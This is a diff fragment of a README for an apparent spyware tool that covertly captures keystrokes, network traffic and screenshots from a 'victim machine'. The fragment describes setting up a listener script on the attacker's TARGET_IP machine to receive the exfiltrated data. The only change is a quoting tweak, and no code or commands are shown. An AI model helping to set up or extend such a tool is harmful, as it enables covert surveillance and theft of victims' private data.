@@ -7,7 +7,7 @@ Stealthy startup script that monitors network traffic, keystrokes, and screen sn
 - Optionally, you may change the time intervals for each activity exfiltration (for keylogging, this interval specifies the duration before a new line of log is created in the generated log file of the keystrokes).
 
 ## Setup (MIRA_Listener.py)
-- Foremost, specify the directories where each type of file regarding the exfiltrated activity are to be stored in the TARGET_IP machine. By default, these are set to Downloads, if you intend to use this directory you MUST change "<User>" into the corresponding user of the TARGET_IP machine.
+- Foremost, specify the directories where each type of file regarding the exfiltrated activity are to be stored in the TARGET_IP machine. By default, these are set to Downloads, if you intend to use this directory you MUST change <User> into the corresponding user of the TARGET_IP machine.
 - Foremost, execute this script in the TARGET_IP machine. While this script is running, it will accept the transmitted files regarding the exfiltrated activity data of the victim machine.
 
 ## Mechanism
